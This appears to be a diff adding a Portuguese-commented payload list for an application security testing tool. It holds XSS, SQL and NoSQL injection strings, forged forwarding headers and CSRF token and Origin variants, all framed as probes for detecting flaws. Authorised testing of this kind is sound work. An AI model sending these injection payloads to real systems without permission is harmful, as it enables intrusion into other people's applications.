@@ -1,0 +1,163 @@
+# ============================================================
+# XSS / OUTPUT ENCODING
+# Objetivo: verificar armazenamento/reflexao e encoding.
+# ============================================================
+<script>alert(1)</script>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+<img src=x onerror=alert(1)>
+"><img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+"><svg onload=alert(1)>
+javascript:alert(1)
+<test>
+<>
+%3Cscript%3Ealert(1)%3C%2Fscript%3E
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+# Marcadores inertes para procurar reflexao sem executar JS
+XSS_TEST_12345
+"><XSS_TEST_12345>
+<XSS_TEST_12345 attr="value">
+
+
+# ============================================================
+# SQL INJECTION
+# Manter mesmo se DynamoDB for usado: outro servico do fluxo
+# ainda pode utilizar banco relacional.
+# ============================================================
+'
+"
+`
+''
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+' AND 1=2--
+1 OR 1=1
+1 AND 1=2
+') OR ('1'='1
+admin'--
+'--
+';
+%27
+%22
+
+# Marcadores para observar erro/interpretacao
+SQL_TEST_12345
+'SQL_TEST_12345
+"SQL_TEST_12345
+
+
+# ============================================================
+# NOSQL / DYNAMODB / ESTRUTURA JSON
+# Mais relevante caso o backend realmente utilize DynamoDB.
+#
+# Aplicar somente quando o campo aceitar JSON/estrutura.
+# O objetivo e detectar se input controlado muda a semantica
+# da consulta em vez de ser tratado como valor literal.
+# ============================================================
+{}
+[]
+null
+true
+false
+{"test":"value"}
+{"id":"test"}
+{"id":null}
+{"id":{}}
+{"id":[]}
+
+# Operadores comuns de engines NoSQL.
+# DynamoDB nao interpreta automaticamente operadores MongoDB;
+# estes tambem ajudam a detectar outra camada/engine NoSQL.
+{"$ne":null}
+{"$ne":""}
+{"$gt":""}
+{"$gte":""}
+{"$regex":".*"}
+{"$exists":true}
+{"$in":["test"]}
+{"id":{"$ne":null}}
+{"id":{"$gt":""}}
+
+# Strings para verificar se objetos serializados sao
+# interpretados ou permanecem literais.
+{"test":{"value":"NOSQL_TEST_12345"}}
+NOSQL_TEST_12345
+$ne
+$gt
+$regex
+
+
+# ============================================================
+# HEADER VALUE VALIDATION
+# Payloads para um header JA EXISTENTE selecionado no Semantic.
+# ============================================================
+HEADER_TEST_12345
+null
+NULL
+undefined
+0
+-1
+true
+false
+<>
+127.0.0.1
+192.0.2.1
+example.invalid
+
+
+# ============================================================
+# NOVOS HEADERS - PROXY / FORWARDING
+#
+# IMPORTANTE:
+# estes nomes NAO sao valores de payload.
+# Sao candidatos a NOVOS headers que a extensao deve inserir.
+# ============================================================
+X-Forwarded-For: 192.0.2.1
+X-Forwarded-Host: example.invalid
+X-Forwarded-Proto: http
+X-Forwarded-Port: 80
+Forwarded: for=192.0.2.1;proto=http;host=example.invalid
+X-Real-IP: 192.0.2.1
+
+# Variante mencionada no teste interno, caso a API realmente
+# utilize esse nome customizado:
+X-Forward: HEADER_TEST_12345
+
+
+# ============================================================
+# CSRF - NOVOS HEADERS / VALIDACAO
+#
+# CSRF nao deve ser decidido apenas por status 200.
+# Comparar ausencia, vazio, invalido e token original.
+# ============================================================
+X-CSRF-Token:
+X-CSRF-Token: null
+X-CSRF-Token: invalid
+X-CSRF-Token: CSRF_TEST_12345
+
+X-CSRFToken:
+X-CSRFToken: null
+X-CSRFToken: invalid
+X-CSRFToken: CSRF_TEST_12345
+
+X-XSRF-TOKEN:
+X-XSRF-TOKEN: null
+X-XSRF-TOKEN: invalid
+X-XSRF-TOKEN: CSRF_TEST_12345
+
+CSRF-Token:
+CSRF-Token: invalid
+CSRF-Token: CSRF_TEST_12345
+
+
+# ============================================================
+# ORIGIN / REFERER PARA AVALIACAO DE CSRF
+# Devem ser inseridos como headers, nao como valor do campo.
+# ============================================================
+Origin: https://example.invalid
+Origin: null
+Referer: https://example.invalid/
+Sec-Fetch-Site: cross-site
